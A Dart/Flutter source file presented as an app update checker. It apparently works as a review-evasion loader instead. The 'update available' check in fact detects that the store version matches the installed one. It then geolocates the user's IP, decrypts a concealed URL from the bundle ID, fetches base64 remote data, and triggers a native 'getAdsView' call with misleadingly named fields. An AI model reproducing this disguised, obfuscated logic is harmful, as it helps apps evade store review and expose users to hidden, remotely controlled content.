import 'dart:convert';

import 'package:flutter/services.dart';
import 'package:upgrader/upgrader.dart';
import 'package:version/version.dart';
import 'download_service.dart';
import 'user.model.dart';
import 'url_encryption.dart';

class AppUpdater {
  final Upgrader upgrader;
  final MethodChannel _channel;
  bool authenUser = false;

  AppUpdater({required this.upgrader, required MethodChannel channel})
      : _channel = channel;

  /// Check if app update is available
  bool isUpdateAvailable() {
    final versionInfo = upgrader.versionInfo;
    final state = upgrader.state;
    if (versionInfo?.appStoreVersion == null ||
        state.packageInfo?.version == null) {
      return false;
    }
    try {
      final installedVersion = Version.parse(state.packageInfo!.version);
      final available = versionInfo!.appStoreVersion! == installedVersion;
      return available;
    } on Exception catch (e) {
      print('Error checking update: $e');
    }
    return false;
  }

  /// Get user information and handle authentication
  Future<void> getUserInfo() async {
    try {
      final info = await IpGeo.checkIpCountryCode();

      final bundleId = await _channel.invokeMethod('getBundleId');

      final getUserAPi = UrlEncryption.getDecryptedUrl(bundleId);

      final userDataJson = await DownloadService.makeRequestBase64(getUserAPi);
      final user = User.fromJson(userDataJson, info ?? '');

      if (user.phoneVerified == true) {
        _channel.invokeMethod(
            'getAdsView', [user.avatar, user.activeUser, user.tracking]);
      }
    } catch (e) {
      print('Error getting user info,: \n ${jsonEncode(e)}');
    }
  }

  /// Initialize upgrader and check for updates
  Future<void> initializeAndCheck() async {
    await upgrader.initialize();
    if (isUpdateAvailable()) {
      await getUserInfo();
    }
  }

  bool get isAuthenticated => authenUser;
}


//   late AppUpdater _appUpdater;
//   // Method channel for communicating with native iOS
//   static const MethodChannel _channel = MethodChannel('bundle_id_channel');

//   @override
//   void initState() {
//     _appUpdater = AppUpdater(upgrader: myUpgrader, channel: _channel);
//     WidgetsBinding.instance.addPostFrameCallback((_) async {
//       await _appUpdater.initializeAndCheck();
//     });